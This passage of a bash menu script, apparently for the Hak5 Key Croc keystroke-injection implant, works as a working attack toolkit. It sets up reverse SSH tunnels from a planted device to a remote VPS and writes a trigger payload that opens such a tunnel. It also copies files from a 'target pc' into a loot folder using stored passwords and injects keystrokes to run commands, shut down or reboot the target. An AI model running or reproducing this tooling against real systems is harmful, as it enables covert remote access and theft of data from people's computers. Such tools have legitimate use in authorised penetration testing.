	sshpass -p $(sed -n 4p ${SAVE_SHELL}) ssh -o "StrictHostKeyChecking no" $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL}) 'ps -aux'
}
vps_command() {
	read_all ENTER COMMAND AND PRESS [ENTER] ; local USER_COMMAND=${r_a}
	sshpass -p $(sed -n 4p ${SAVE_SHELL}) ssh -o "StrictHostKeyChecking no" $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL}) ''${USER_COMMAND}''
}
##
#----SSH reverse ssh tunnel keycroc to VPS (payload)
##
reverse_payload() {
	clear
	echo -ne "$(Info_Screen '
-Create Reverse SSH Tunnel Payload keycroc to remote-server
-Plug keycroc into Target pc and type in croctunnel
-Keycroc side will be setup as below
-->ssh -fN -R port#:localhost:22 username@remote-server-ip
-Enter on remote-server side as below
-->ssh root@localhost -p port#')\n"
local PAYLOAD_SHELL=/root/udisk/payloads/Croc_Shell.txt
if [ -e "${PAYLOAD_SHELL}" ]; then
	echo -ne "\n$(ColorGreen 'Croc_Shell already exists')\n"
	cat ${PAYLOAD_SHELL}
	echo -ne "\n${LINE}\n"
	read_all KEEP THIS SETUP Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		echo -ne "\n$(ColorGreen 'Keeping existing Croc_Shell Payload')\n" ;;
	[nN] | [nN][oO])
		rm ${PAYLOAD_SHELL}
		shell_input
	echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to remote server
# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
		echo -ne "\n$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\n"
		cat ${PAYLOAD_SHELL} ;;
	*)
		invalid_entry ; croc_reverse_shell ;;
	esac
else
	echo -ne "\n$(ColorRed 'Did not find Croc_Shell Payload')\n"
	shell_input
	echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to remote server
# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
	echo -ne "\n$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\n"
fi
}
if [ -e "${SAVE_SHELL}" ]; then
	echo -ne "\n${yellow}VPS IP: ${clear}$(sed -n 1p ${SAVE_SHELL})\n${yellow}VPS username: ${clear}$(sed -n 3p ${SAVE_SHELL})\n${yellow}VPS Port: ${clear}$(sed -n 2p ${SAVE_SHELL})\n"
	read_all EXISTING VPS SETUP KEEP THEM Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		echo -ne "\n$(ColorYellow 'KEEPING EXISTING VPS SETUP')\n"
		unset -f ping_alert && killall tcpdump 2> /dev/null
		ping -q -c 1 -w 1 $(sed -n 1p ${SAVE_SHELL}) &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			echo -ne "${red}Unable to reach VPS ${clear}$(sed -n 1p ${SAVE_SHELL})\n"
		elif [[ "${#args[@]}" -eq 0 ]]; then
##
#----VPS Menu
##
			MenuTitle REMOTE VPS MENU ; MenuColor 24 1 START REVERSE SSH TUNNEL ; MenuColor 24 2 CHECK VPS STATUS ; MenuColor 24 3 START SSH TO VPS ; MenuColor 24 4 REMOTE COMMAND TO VPS ; MenuColor 24 5 REVERSE TUNNEL PAYLOAD ; MenuColor 24 6 RETURN TO MAIN MENU
			MenuEnd 27
			case $m_a in
			1) start_tunnel ;; 2) vps_info ; ssh_tunnel ;; 3) ssh_vps ;; 4) vps_command ; ssh_tunnel ;; 5) reverse_payload ; ssh_tunnel ;; 6) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; start_tunnel ;;
			esac
		fi ;;
	[nN] | [nN][oO])
		rm ${SAVE_SHELL}
		shell_input ; user_input_passwd ${SAVE_SHELL} VPS ; ssh_tunnel ;;
	*)
		invalid_entry ; ssh_tunnel ;;
	esac
else
	echo -ne "$(ColorRed 'Did not find any saved remote-server VPS shell setup')\n"
	shell_input ; user_input_passwd ${SAVE_SHELL} VPS ; ssh_tunnel
fi
}
##
#----SSH Copy a Local File to a Remote System with the scp Command
##
remote_file() {
	clear
	local TARGET_USERNAME=$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
	echo -ne "$(Info_Screen '
-Copy a Local File to a Remote System with the scp Command
-Example:
-scp path/to/local/file.ext remote_username@remote_IP:path/to/remote/file.ext
-Copy a Remote File to a Local System using the scp Command
-Example:
-scp remote_username@remote_IP:path/to/remote/file.ext path/to/local/file.ext')\n\n"
##
#----SSH send Remote File keycroc to target pc
##
keycroc_target() {
	clear
	echo -ne "$(Info_Screen '
-Send file from keycroc to target pc
-Save to target pc home')\n\n"
	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
	read_all ENTER THE DIRECTORY NAME TO VEIW FILES AND PRESS [ENTER] ; local r_f=${r_a}
	f=`find /${r_f} -type f -name "*"` ; echo -ne "${green}${f}${clear}\n"
	read_all ENTER THE FULL PATH OF FILE TO SEND AND PRESS [ENTER]
	if [ -e "${r_a}" ]; then
		if [ "$(OS_CHECK)" = WINDOWS ]; then
			sshpass -p $(target_pw) scp -o "StrictHostKeyChecking no" ${r_a} ${TARGET_USERNAME}@$(os_ip):/C:/
		elif [ "$(OS_CHECK)" = LINUX ]; then
			sshpass -p $(target_pw) scp -o "StrictHostKeyChecking no" ${r_a} ${TARGET_USERNAME}@$(os_ip):~/
		fi
	else
		echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
	fi
}
##
#----SSH Receive Remote File target pc to keycroc
##
target_keycroc() {
	clear
	echo -ne "$(Info_Screen '
-Receive file from target pc to keycroc
-Save to keycroc loot/Croc_Pot
-Will need to know the path of file on target pc')\n\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'powershell -Command "& {Get-ChildItem -Recurse | ?{ $_.PSIsContainer } | Select-Object FullName, ` @{Name=\"FileCount\";Expression={(Get-ChildItem $_ -File | Measure-Object).Count }}}"' 2> /dev/null
	read_all ENTER THE DIRECTORY NAME TO VEIW FILES AND PRESS [ENTER] ; local r_f=${r_a}
	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'powershell -Command "& {Get-ChildItem -Path '${r_f}' | Select-Object FullName}"'
	read_all ENTER THE FULL PATH OF FILE TO RECEIVE AND PRESS [ENTER]
	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'test -e '${r_a}''
	if [ $? -eq 0 ]; then
		sshpass -p $(target_pw) scp ${TARGET_USERNAME}@$(os_ip):${r_a} /root/udisk/loot/Croc_Pot
	else
		echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
	fi
elif [ "$(OS_CHECK)" = LINUX ]; then
	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'cd / ; for i in `ls -d */` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo -ne "'${yellow}'Directory: '${clear}''${cyan}'${i} '${clear}''${yellow}'Contains: '${clear}''${green}'${g} '${clear}''${yellow}'files.'${clear}'\n"; done 2> /dev/null'
	read_all ENTER THE DIRECTORY NAME TO VEIW FILES AND PRESS [ENTER] ; local r_f=${r_a}
	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'f=`sudo find /'${r_f}' -type f -name "*.*"` ; echo -ne "'${green}'${f}'${clear}'\n"'
	read_all ENTER THE FULL PATH OF FILE TO RECEIVE AND PRESS [ENTER]
	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'test -e '${r_a}''
	if [ $? -eq 0 ]; then
		sshpass -p $(target_pw) scp ${TARGET_USERNAME}@$(os_ip):${r_a} /root/udisk/loot/Croc_Pot
	else
		echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
	fi
fi
}
##
#----SSH send Remote File by enter target credentials host_name/host_ip
##
user_file() {
	clear
	echo -ne "$(Info_Screen '
-Send file from keycroc to remote host
-Save to remote host home')\n\n"
read_all ENTER REMOTE HOST IP AND PRESS [ENTER] ; local r_h=${r_a}
if [[ ${r_h} =~ ${validate_ip} ]]; then
	unset -f ping_alert && killall tcpdump 2> /dev/null
	ping -q -c 1 -w 1 ${r_h} &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		echo -ne "${red}Unable to reach host${clear}\n"
	elif [[ "${#args[@]}" -eq 0 ]]; then
		cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
		read_all ENTER THE DIRECTORY NAME TO VEIW FILES AND PRESS [ENTER] ; local r_f=${r_a}
		f=`find /${r_f} -type f -name "*"` ; echo -ne "${green}${f}${clear}\n"
		read_all ENTER THE FULL PATH OF FILE TO SEND AND PRESS [ENTER] ; local c_f=${r_a}
		if [ -e "${c_f}" ]; then
			read_all ENTER REMOTE HOST_NAME AND PRESS [ENTER] ; local r_n=${r_a}
			scp -o "StrictHostKeyChecking no" ${c_f} ${r_n}@${r_h}:~/
		else
			echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
		fi
	fi
else
	echo -ne "${red}Not a valid ip address${clear}\n" ; invalid_entry
fi
}
##
#----SSH Receive Remote File from remote target/host
##
remote_host() {
	clear
	echo -ne "$(Info_Screen '
-Receive file from remote host to keycroc
-Save to keycroc loot/Croc_Pot
-Will need to know the path of file on remote host')\n\n"
	read_all ENTER REMOTE HOST IP AND PRESS [ENTER] ; local r_h=${r_a}
if [[ ${r_h} =~ ${validate_ip} ]]; then
	unset -f ping_alert && killall tcpdump 2> /dev/null
	ping -q -c 1 -w 1 ${r_h} &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		echo -ne "${red}Unable to reach host${clear}\n"
	elif [[ "${#args[@]}" -eq 0 ]]; then
		read_all ENTER REMOTE HOST_NAME AND PRESS [ENTER] ; local r_n=${r_a}
		ssh -o "StrictHostKeyChecking no" ${r_n}@${r_h} 'cd / ; for i in `ls -d */` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo -ne "'${yellow}'Directory: '${clear}''${cyan}'${i} '${clear}''${yellow}'Contains: '${clear}''${green}'${g} '${clear}''${yellow}'files.'${clear}'\n"; done 2> /dev/null'
		read_all ENTER THE DIRECTORY NAME TO VEIW FILES AND PRESS [ENTER] ; local r_f=${r_a}
		ssh ${r_n}@${r_h} 'f=`sudo find /'${r_f}' -type f -name "*.*"` ; echo -ne "'${green}'${f}'${clear}'\n"'
		read_all ENTER THE FULL PATH OF FILE TO RECEIVE AND PRESS [ENTER]
		ssh ${r_n}@${r_h} 'test -e '${r_a}''
		if [ $? -eq 0 ]; then
			scp ${r_n}@${r_h}:${r_a} /root/udisk/loot/Croc_Pot
		else
			echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
		fi
	fi
else
	echo -ne "${red}Not a valid ip address${clear}\n" ; invalid_entry
fi
}
##
#----SSH Remote File with scp Command menu
##
MenuTitle REMOTE FILE MENU ; MenuColor 21 1 KEYCROC TO TARGET PC ; MenuColor 21 2 TARGET PC TO KEYCROC ; MenuColor 21 3 SEND TO REMOTE HOST ; MenuColor 21 4 RECEIVE REMOTE HOST ; MenuColor 21 5 RETURN TO MAIN MENU ; MenuEnd 24
	case $m_a in
	1) keycroc_target ; remote_file ;; 2) target_keycroc ; remote_file ;; 3) user_file ; remote_file ;; 4) remote_host ; remote_file ;; 5) main_menu ;; 0) exit 0 ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; remote_file ;;
	esac
}
##
#----SSH Execute a remote command on a host over SSH
##
remote_command() {
	clear
	echo -ne "$(Info_Screen '
-Execute a remote command on a host over SSH
-Example: ssh root@192.168.1.1 uptime
-ssh USER@HOST COMMAND1; COMMAND2; COMMAND3 or
-ssh USER@HOST COMMAND1 | COMMAND2 | COMMAND3
-SSH between remote hosts and get back the output')\n\n"
target_command() {
	read_all ENTER COMMAND AND PRESS [ENTER] ; local USER_COMMAND=${r_a}
	ssh -o "StrictHostKeyChecking no" ${1}@${@:2} ''${USER_COMMAND}''
	sleep 5
}
input_command() {
	read_all ENTER TARGET USERNAME AND PRESS [ENTER] ; local USERNAME_COMMAND=${r_a}
	read_all ENTER TARGET IP AND PRESS [ENTER] ; local IP_COMMAND=${r_a}
	read_all ENTER COMMAND AND PRESS [ENTER] ; local USER_COMMAND=${r_a}
	ssh -o "StrictHostKeyChecking no" ${USERNAME_COMMAND}@${IP_COMMAND} ''${USER_COMMAND}''
	sleep 5
}
pc_target_command() {
	read_all ENTER COMMAND AND PRESS [ENTER] ; local USER_COMMAND=${r_a}
if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip) ''${USER_COMMAND}''
	sleep 5
else
	ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip) ''${USER_COMMAND}''
	sleep 5
fi
}
##
#----SSH remote command Menu
##
command_menu() {
MenuTitle REMOTE COMMAND MENU ; MenuColor 24 1 COMMAND TO TARGET PC ; MenuColor 24 2 USERNAME/IP AND COMMAND ; MenuColor 24 3 COMMAND TO SQUIRREL
MenuColor 24 4 COMMAND TO TURTLE ; MenuColor 24 5 COMMAND TO SHARK ; MenuColor 24 6 COMMAND TO BUNNY ; MenuColor 24 7 RETURN TO MAIN MENU ; MenuEnd 27
	case $m_a in
	1) pc_target_command ; command_menu ;; 2) input_command ; command_menu ;; 3) target_command root 172.16.32.1 ; command_menu ;; 4) target_command root 172.16.84.1 ; command_menu ;;
	5) shark_check ; target_command root ${DEFAULT_IP} ; command_menu ;; 6) target_command root localhost -p 7000 ; command_menu ;; 7) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; remote_command ;;
	esac
}
command_menu
}
##
#----SSH croc reverse shell Menu
##
MenuTitle REVERSE SSH TUNNEL MENU ; MenuColor 24 1 REVERSE TUNNEL NETCAT ; MenuColor 24 2 CROC LISTENING ; MenuColor 24 3 REVERSE TUNNEL TARGET PC ; MenuColor 24 4 REVERSE SSH TUNNEL VPS
MenuColor 24 5 REMOTE COMMANDS TARGETS ; MenuColor 24 6 SEND FILE WITH SCP ; MenuColor 24 7 RETURN TO MAIN MENU ; MenuEnd 27
	case $m_a in
	1) remote_listener ; croc_reverse_shell ;; 2) croc_listener ; croc_reverse_shell ;; 3) shell_pc ; croc_reverse_shell ;; 4) ssh_tunnel ; croc_reverse_shell ;;
	5) remote_command ;; 6) remote_file ;; 7) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) ssh_menu ;; *) invalid_entry ; croc_reverse_shell ;;
	esac
}
##
#----SSH remove ssh-keygen -f "/root/.ssh/known_hosts" -R (IP)
##
remove_sshkey() {
	clear
	echo -ne "$(Info_Screen '
-Add correct host key in /root/.ssh/known_hosts to get rid of this message
-remove with: ssh-keygen -f "/root/.ssh/known_hosts" -R IP
-Just add the IP to remove ssh-keygen')\n\n"
read_all REMOVE SSH_KEYGEN FOR PACIFIC IP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER THE IP FOR SSH_KEYGEN REMOVAL AND PRESS [ENTER]
	ssh-keygen -f "/root/.ssh/known_hosts" -R ${r_a} ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Did not make any changes')\n" ;;
*)
	invalid_entry ; remove_sshkey ;;
esac
}
##
#----SSH main Menu
## 
MenuTitle CROC POT SSH MENU
echo -ne "\t\t" ; MenuColor 18 1 SSH TARGET PC | tr -d '\t\n' ; MenuColor 20 8 SIGNAL OWL | tr -d '\t'
echo -ne "\t\t" ; MenuColor 18 2 SSH USER INPUT | tr -d '\t\n' ; MenuColor 20 9 SHARK JACK | tr -d '\t'
echo -ne "\t\t" ; MenuColor 18 3 ENABLE_SSH | tr -d '\t\n' ; MenuColor 19 10 BASH BUNNY | tr -d '\t'
echo -ne "\t\t" ; MenuColor 18 4 DISABLE_SSH | tr -d '\t\n' ; MenuColor 19 11 REVERSE SHELL MENU | tr -d '\t'
echo -ne "\t\t" ; MenuColor 18 5 WIFI PINEAPPLE MK7 | tr -d '\t\n' ; MenuColor 19 12 PUBLIC/PRIVATE KEY | tr -d '\t'
echo -ne "\t\t" ; MenuColor 18 6 PACKET SQUIRREL | tr -d '\t\n' ; MenuColor 19 13 REMOVE SSH_KEYGEN | tr -d '\t'
echo -ne "\t\t" ; MenuColor 18 7 LAN TURTLE | tr -d '\t\n' ; MenuColor 18 14 RETURN TO MAIN MENU | tr -d '\t'
MenuEnd 23
	case $m_a in
	1) pc_ssh ; ssh_menu ;; 2) echo -ne "${yellow}Reachable target on local network:${clear}\n" ; reachable_target ; userinput_ssh ; ssh_menu ;; 3) ENABLE_SSH ; ssh_menu ;; 4) DISABLE_SSH ; ssh_menu ;; 5) ssh_pineapple ;; 6) ssh_squirrel ; ssh_menu ;; 7) ssh_turtle ; ssh_menu ;;
	8) ssh_owl ; ssh_menu ;; 9) ssh_shark ; ssh_menu ;; 10) ssh_bunny ; ssh_menu ;; 11) croc_reverse_shell ; ssh_menu ;; 12) ssh_keygen ; ssh_menu ;; 13) remove_sshkey ; ssh_menu ;; 14) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; ssh_menu ;;
	esac
}
##
#----Keycroc recovery menu/function
##
function croc_recovery() {
	clear
	echo -ne "$(Info_Screen '
-Download/install The lastest firmware from Hak5
-This will save the Firmware to root of the KeyCroc drive
-Restore the keycroc firmware with the lastest firmware
-Keycroc-docs @ https://docs.hak5.org/key-croc/
-Change timezone')\n"
##
#----Download lastest keycroc firmware save to /root/udisk
##
croc_firmware() {
	clear
	echo -ne "$(Info_Screen '
-This will Download KeyCroc lastest firmware from Hak5
Download center and place on root of the KeyCroc drive
-Download may take some time
-This will Verify sha256 checksum after download
-3356d9f80dedd4c3afd0a9014e966a692272f83ff3256e8a2a3dd4e60544740e
-After download unplug keycroc plug back in
-Wait until the LED RED & BLUE stop flashing')\n\n"
if [ -e /root/udisk/kc_fw_1.3_510.tar.gz ]; then
	echo -ne "\n$(ColorGreen 'KeyCroc lastest firmware file already exists')\n"
else
	read_all DOWNLOAD/INSTALL LASTEST KEYCROC FIRMWARE Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		echo -ne "\n$(ColorYellow '-Downloading KeyCroc lastest firmware')\n"
		wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.3-stable/kc_fw_1.3_510.tar.gz -P /root/udisk
		echo -ne "\n${yellow}Verifying SHA256 Checksum with sha256sum command${clear}\n"
		local CrocFirmware="3356d9f80dedd4c3afd0a9014e966a692272f83ff3256e8a2a3dd4e60544740e"
		local ckeckFirmware=$(sha256sum /root/udisk/kc_fw_1.3_510.tar.gz | awk '{print $1}')
		if [[ ${CrocFirmware} == ${ckeckFirmware} ]]; then
			LED G
			echo -ne "\n${green}SHA-256 checksum match it is safe to install Firmware unplug keycroc plug back in${clear}\n"
		else
			LED R
			echo -ne "${red}SHA-256 checksum DID NOT match it is not safe to install Firmware removing kc_fw_1.3_510.tar.gz${clear}\n"
			rm -f /root/udisk/kc_fw_1.3_510.tar.gz
		fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; croc_firmware ;;
	esac
fi
}
##
#----recovery repair locale LANG=en_US.UTF-8
##
locale_en_US() {
	clear
	echo -ne "\n$(Info_Screen '
--This will fix LC_ALL=en_US.UTF-8 if running into this error at ssh 
--bash: warning: setlocale: LC_ALL: cannot change locale en_US.UTF-8
--This is for US language
--Not sure if this will work on other language keyboards')\n\n"
	read_all FIX THE ERROR Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorGreen 'Repairing The error')\n"
	echo "LC_ALL=en_US.UTF-8" >> /etc/environment
	echo "en_US.UTF-8 UTF-8" >> /etc/locale.gen
	echo "LANG=en_US.UTF-8" > /etc/locale.conf
	locale-gen en_US.UTF-8
	echo -ne "\n$(ColorGreen 'Done Repairing The error unplug the keycroc and plug back in')\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Returning back to menu')\n"
	croc_recovery ;;
*)
	invalid_entry ; croc_recovery ;;
esac
}
##
#----Remove Croc_Pot and all its contents
##
remove_croc_pot() {
	clear
	echo -ne "\n$(Info_Screen '
-Completely remove Croc_Pot and all its contents from the KeyCroc')\n\n"
	echo -ne "$(ColorRed 'ARE YOU SURE TO REMOVE CROC_POT TYPE YES OR NO AND PRESS [ENTER]:')"; read -p $(echo -ne "\e[30;42m") CROC_POT_REMOVE && echo -ne "${clear}"
case $CROC_POT_REMOVE in
[yY] | [yY][eE][sS])
	apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan speedtest-cli host hping3 stunnel ike-scan wamerican-huge rlwrap iptraf-ng macchanger
	rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot /root/udisk/payloads/Croc_Lockout.txt
	rm /usr/local/bin/c2-3.2.0_armv7_linux /etc/systemd/system/hak5.service /root/udisk/payloads/Getonline_Linux.txt /root/udisk/payloads/Croc_Redirect.txt /root/udisk/payloads/Restricted_words.txt
	rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt /root/udisk/payloads/Croc_Bite.txt.txt /usr/local/bin/cht.sh /root/udisk/payloads/Delete_Char.txt
	rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt /root/udisk/payloads/No_Sleeping.txt /root/udisk/payloads/Croc_close_it.txt
	rm /root/udisk/payloads/Getonline_Raspberry.txt /root/udisk/payloads/Quick_Start_C2.txt /root/udisk/payloads/Croc_replace.txt /root/udisk/payloads/Live_keystroke.txt
	rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Getonline_Windows.txt /root/udisk/payloads/Croc_Force_payload.txt /root/udisk/payloads/Keyboard_Killer.txt
	rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/payloads/Croc_Defender.txt /root/udisk/payloads/Quack_Attack.txt
	rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt /root/udisk/payloads/Croc_Shell.txt /root/udisk/payloads/Double_up.txt /root/udisk/payloads/Croc_Attackmode.txt
	apt-get autoremove
	exit ;;
[nN] | [nN][oO])
	echo -e "\n$(ColorYellow 'Return Back to main menu')" ; main_menu ;;
*)
	invalid_entry ; remove_croc_pot
esac
}
##
#----Keycroc apt update/upgrade Packages
##
croc_update() {
	clear
	echo -ne "$(Info_Screen '
-Update/Upgrade KeyCroc Packages
-NOTE: This could break important Packages the keycroc needs to work properly')\n\n"
	read_all UPDATE KEYCROC PACKAGES Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorGreen 'UPDATING AND UPGRADING THE KEYCROC PACKAGES')\n"
	apt update && apt upgrade -y ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'RETURING BACK TO MENU')\n" ;;
*)
	invalid_entry ; croc_update ;;
esac
}
##
#----Recovery Reboot/Shutdown target pc
##
reboot_shutdown() {
	clear
	echo -ne "$(Info_Screen '
-Reboot or shutdown Target pc')\n\n"
##
#----Recovery Shutdown target pc
##
shutdown_pc() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Stop-Computer -ComputerName localhost" ; Q ENTER
else
	case $HOST_CHECK in
	raspberrypi)
		Q CONTROL-ALT-t ; sleep 1 ; Q STRING "shutdown -h 0" ; Q ENTER ;;
	$HOST_CHECK)
		Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -h 0" ; Q ENTER ;;
	*)
		Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -h 0" ; Q ENTER ;;
	esac
fi
}
##
#----Recovery Reboot target pc
##
reboot_pc() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Restart-Computer" ; Q ENTER
else
	case $HOST_CHECK in
	raspberrypi)
		Q CONTROL-ALT-t ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
	$HOST_CHECK)
		Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
	*)
		Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
	esac
fi
}
##
#----Recovery Reboot/Shutdown menu
##
MenuTitle REBOOT/SHUTDOWN TARGET PC ; MenuColor 19 1 SHUTDOWN TARGET PC ; MenuColor 19 2 REBOOT TARGET PC ; MenuColor 19 3 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) shutdown_pc ;; 2) reboot_pc ;; 3) main_menu ;; 0) exit 0 ;; [bB]) croc_recovery ;; [pP]) Panic_button ;; *) invalid_entry ; reboot_shutdown ;;
	esac
}
##
#----Set Keycroc clock to timezone
##
croc_clock() {
	clear
	echo -ne "$(Info_Screen '
-Set keycroc clock to your timezone
-To view all available time zones, use the timedatectl command
      timedatectl list-timezones
Example change the system’s timezone to America/New_York type:
      timedatectl set-timezone America/New_York')\n\n"
	echo -ne "${yellow}Keycroc current timezone:${clear}\n"
	timedatectl
read_all TIMEZONE LIST [L] CHANGE TIMEZONE [C] CURRENT TIMEZONE [V] AND PRESS [ENTER]
case "$r_a" in
	[lL])
		timedatectl list-timezones ;;
	[cC])
		echo -ne "${yellow}Enter timezone location Example: America/New_York${clear}\n"
		read_all ENTER TIMEZONE LOCATION AND PRESS [ENTER]
		timedatectl set-timezone ${r_a} ; croc_timezone=${r_a} ;;
	[vV])
		timedatectl ;;
	*)
		invalid_entry ; croc_recovery ;;
esac
}
##
#----install macchanger and change keycroc mac address
##
mac_changer() {
	clear
	echo -ne "$(Info_Screen '
-Install macchanger and change keycroc mac address
-Return to original MAC address unplug keycroc plug back in

[R]-Randomly Change the MAC Address
[M]-Manually Change the MAC Address
[S]-Restore Original Mac Address
[N]-Return back to menu

-Run on target local shell terminal
-Requirements: macchanger
https://github.com/alobbs/macchanger')\n"
if [ -f "/root/udisk/tools/Croc_Pot/croc_original_mac.txt" ]; then
	local original_mac=$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)
else
	cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address > /root/udisk/tools/Croc_Pot/croc_original_mac.txt 2> /dev/null
	local original_mac=$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)
fi
	install_package macchanger MAC_CHANGER mac_changer croc_recovery
	echo -ne "${yellow}$(macchanger -V | grep "GNU MAC" | sed 's/[^ ]* *//')${clear}\n"
	echo -ne "${yellow}ORIGINAL MAC: ${clear}${green}${original_mac}${clear}\n"
	echo -ne "${yellow}$(macchanger -s wlan0)${clear}\n\n"
	read_all [R]-RANDOMLY [M]-MANUALLY [S]-RESTORE [N]-NONE PRESS [ENTER]
	case $r_a in
	[rR])
		echo -ne "#!/bin/bash
Q STRING \"PID_WPA=\\\$(pidof wpa_supplicant)\" ; Q ENTER
Q STRING \"PID_DHC=\\\$(pidof dhclient)\" ; Q ENTER
Q STRING \"ifconfig wlan0 down && macchanger -r wlan0 && ifconfig wlan0 up && kill -9 \\\$PID_WPA && kill -9 \\\$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0 && sleep 2 && \" 
Q STRING \"Q STRING \\\"ssh -o 'StrictHostKeyChecking no' root@\\\$(ifconfig wlan0 | grep \\\"inet addr\\\" | awk {'print \\\$2'} | cut -c 6-)\\\" && sleep 1 && Q ENTER & sleep 1 && exit\"\nQ ENTER" > /tmp/mac_changer.sh
		chmod +x /tmp/mac_changer.sh
		cat /tmp/mac_changer.sh
		sleep 1
		bash /tmp/mac_changer.sh && exit & ;;
	[mM])
		read_all ENTER MAC ADDRESS AND PRESS [ENTER]
		echo -ne "#!/bin/bash
